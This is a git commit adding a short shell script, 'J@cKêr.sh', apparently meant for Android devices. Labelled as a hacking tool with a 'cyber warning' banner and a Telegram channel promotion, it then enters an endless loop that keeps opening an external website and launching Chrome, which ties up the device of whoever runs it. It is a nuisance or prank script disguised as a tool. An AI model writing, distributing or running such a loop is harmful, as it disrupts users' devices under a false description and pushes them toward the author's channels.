b5bc5ddc258f3c1ee563c51f10108c363bbddfc1
Mrkarthick <78952385+mrkarthick-cool@users.noreply.github.com>
2022-07-03 22:06:13 +0530

    Create J@cKêr.sh

---
+++ J@cKêr.sh
@@ -0,0 +1,31 @@
+
+
+clear
+
+echo "       𝐉𝐨𝐢𝐧 𝐭𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐜𝐡𝐚𝐧𝐧𝐞𝐥  " 
+
+echo ""
+
+echo " https://telegram.me/ANONYMOUSKINGCHANNEL" 
+
+echo " "
+
+echo "          ☠️ 🄲🅈🄱🄴🅁 🅆🄰🅁🄽🄸🄽🄶 ⚠️ "
+
+echo " "
+
+echo " this tool developer : KARTHICK "
+
+sleep 2 
+
+xdg-open https://telegram.me/ANONYMOUSKINGCHANNEL
+
+while :
+
+do
+
+xdg-open https://jockerrk.w3spaces.com/
+
+am start --user 0 -n com.android.chrome/com.google.android.apps.chrome.Main
+
+done 
